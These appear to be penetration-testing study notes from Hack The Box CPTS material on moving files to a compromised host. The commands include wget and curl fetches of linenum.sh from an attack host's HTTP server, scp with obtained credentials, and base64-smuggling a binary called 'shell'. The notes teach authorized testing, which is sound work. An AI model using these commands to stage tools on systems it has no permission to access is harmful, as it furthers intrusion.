---
tags:
  - Material
  - HTB
  - CPTS
  - File-Transfer
  - Networking
---
> During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

---

## Using wget

> One method is running a Python HTTP server on our machine and then using `wget` or cURL to download the file on the remote host.

First, go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

```shell
cd /tmp
python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```shell
wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

We used our IP `10.10.14.1` and the port our Python server runs on `8000`.

If the remote server does not have `wget`, we can use cURL to download the file:

```shell
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

> [!info] -o The `-o` flag specifies the output file name.

---

## Using SCP

> Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host.

```shell
scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

We specified the local file name after `scp`, and the remote directory it will be saved to after the `:`.

---

## Using Base64

> In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this situation, we can base64 encode the file into base64 format, paste the base64 string on the remote server, and decode it.

For example, to transfer a binary file called `shell`, we can base64 encode it as follows:

```shell
base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now we can copy this base64 string, go to the remote host, and use `base64 -d` to decode it, piping the output into a file:

```shell
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

---

## Validating File Transfers

> To validate the format of a file, we can run the `file` command on it.

```shell
file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Running the `file` command on the `shell` file says it is an ELF binary, meaning we successfully transferred it.

To ensure we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, run `md5sum` on it:

```shell
md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Now go to the remote server and run the same command on the file we transferred:

```shell
md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Both files have the same md5 hash, meaning the file was transferred correctly.

> [!info] File Transfers module There are various other methods for transferring files. The File Transfers module provides a more detailed study on transferring files.

---

## Related Source